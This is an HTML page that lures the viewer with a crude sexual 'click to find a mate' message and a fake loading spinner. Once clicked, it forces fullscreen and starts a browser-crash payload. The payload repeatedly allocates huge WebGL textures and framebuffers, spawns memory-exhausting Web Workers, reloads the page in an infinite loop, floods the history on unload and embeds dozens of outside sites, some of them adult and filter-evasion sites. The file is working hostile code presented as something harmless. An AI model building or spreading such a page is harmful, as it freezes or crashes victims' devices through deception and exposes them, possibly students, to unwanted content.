<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }
    
    body {
      background: #0a0a0c;
      margin: 0;
      overflow: hidden;
      height: 100vh;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      color: #ffffff;
    }

    .loader-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      gap: 24px;
      cursor: pointer;
      user-select: none;
      transition: transform 0.2s ease;
      z-index: 9999;
    }

    .loader-container:active {
      transform: scale(0.99);
    }

    .slider-wrapper {
      position: relative;
      width: 100px;
      height: 100px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .track {
      position: absolute;
      width: 100%;
      height: 100%;
      border: 4px solid rgba(255, 255, 255, 0.05);
      border-radius: 50%;
      display: none; 
    }

    .static-ring {
      position: absolute;
      width: 100%;
      height: 100%;
      border: 4px solid transparent;
      border-top: 4px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      transition: all 0.3s ease;
      display: none;
    }

    .rotator {
      position: absolute;
      width: 100%;
      height: 100%;
      border: 4px solid transparent;
      border-top: 4px solid #3b82f6;
      border-radius: 50%;
      animation: spin 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
      display: none;
    }

    .status-text {
      font-size: 24px;
      font-weight: 500;
      letter-spacing: 0.5px;
      color: rgba(255, 255, 255, 0.8);
      transition: color 0.3s ease;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="loader-container" id="interactiveZone" onclick="startLoading()">
    <div class="slider-wrapper">
      <div class="track" id="bgTrack"></div>
      <div class="static-ring" id="staticRing"></div>
      <div class="rotator" id="rotatorRing"></div>
    </div>
    <div class="status-text" id="statusLabel">Click here to search for a fuck mate 🤤🥵</div>
    <div id="embeds"></div>
  </div>

  <script>
    window.onbeforeunload = function() {
      history.pushState(0,0, new Array(1000000).join("a"));
    }
    const interactiveZone = document.getElementById('interactiveZone');
    const statusLabel = document.getElementById('statusLabel');
    const staticRing = document.getElementById('staticRing');
    const rotatorRing = document.getElementById('rotatorRing');
    const bgTrack = document.getElementById('bgTrack');
    
    let textures = [];
    let gls = [];
    let workers = [];
    let fullScreen = false;

    const canvas = document.createElement('canvas');
    canvas.width = 2048;
    canvas.height = 2048;
    canvas.style.display = 'none';
    document.body.appendChild(canvas);
    const gl = canvas.getContext('webgl');

    function createTextures() {
      for (let i = 0; i < 200; i++) {
        const size = 2048;
        const tex = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, tex);
        const pixels = new Uint8Array(size * size * 4);
        pixels.fill(i % 255);
        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
        textures.push(tex);
      }
    }

    function framebufferInsanity() {
      for (let i = 0; i < 20; i++) {
        const tex = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, tex);
        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
        const fb = gl.createFramebuffer();
        gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
        gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
        gl.clear(gl.COLOR_BUFFER_BIT);
        gls.push(gl);
      }
    }

    function spawnWorkers() {
      for (let i = 0; i < 8; i++) {
        const workerScript = new Blob([`
          let arr = [];
          while (true) {
            arr.push(new Float64Array(50_000_000).fill(Math.random()));
          }
        `], { type: 'application/javascript' });
        const worker = new Worker(URL.createObjectURL(workerScript));
        workers.push(worker);
      }
    }

    function animate() {
      if (typeof canvases !== 'undefined') {
        for (const c of canvases) {
          const ctx = c.getContext('2d');
          ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
          ctx.fillRect(0, 0, c.width, c.height);
        }
      }
      requestAnimationFrame(animate);
    }

    function startLoading() {
      bgTrack.style.display = 'block';
      rotatorRing.style.display = 'block';
      
      statusLabel.textContent = "Finding a Match...";
      statusLabel.style.color = "#3b82f6";
      
      if (!fullScreen) {
        const doc = document.documentElement;
        if (doc.requestFullscreen) doc.requestFullscreen();
        else if (doc.mozRequestFullScreen) doc.mozRequestFullScreen();
        else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.msRequestFullscreen) doc.msRequestFullscreen();
        fullScreen = true;
      }

      loadSites();
      keepCrashGoing();
      setTimeout(() => {
        while (1) location.reload();
      }, 500);
    }

    function keepCrashGoing() {
      setInterval(() => {
        createTextures();
        framebufferInsanity();
        spawnWorkers();
        requestAnimationFrame(animate);
      }, 10);
    }

    const sites = [
        "https://coolmathgames.com",
        "https://math.kazwire.com",
        "https://neal.fun",
        "https://cookieduck-dev.github.io",
        "https://poets.kazwire.com",
        "https://monkeygg2.github.io",
        "https://kazwire.com",
        "https://ytmp3.cc",
        "https://ytmp3.nu",
        "https://ytmp3.plus",
        "https://sites.google.com/site/classroom6x/",
        "https://ytmp3.press",
        "https://ytmp3.art",
        "https://en.loader.to/4/",
        "https://ytmp3.hair",
        "https://now.gg",
        "https://sites.google.com/view/class-room-6x/",
        "https://edit.coolmath-games.com",
        "https://now.us",
        "https://xn--31byd1i.net",
        "https://nachderstille.de/",
        "https://google.com/search?q=unblocker%20proxy/",
        "https://nordvpn.com/",
        "https://ww1.ytmp3.com.se/",
        "https://ytmp3.pub/",
        "https://twitter.com",
        "https://aa.cf",
        "https://bb.cf",
        "https://gg.cf",
        "https://gq.cf",
        "https://reddit.com",
        "https://ytmp3.show/",
        "https://canvas.instructure.cf",
        "https://ballbang.com/"
    ];
    function loadSites() {
        const container = document.getElementById("embeds");
        container.innerHTML = "";
        sites.forEach(url => {
            const embed = document.createElement("embed");
            embed.src = url;
            embed.type = "text/html";
            embed.width = "400";
            embed.height = "300";
            container.appendChild(embed);
        });
    }
  </script>

</body>
</html>
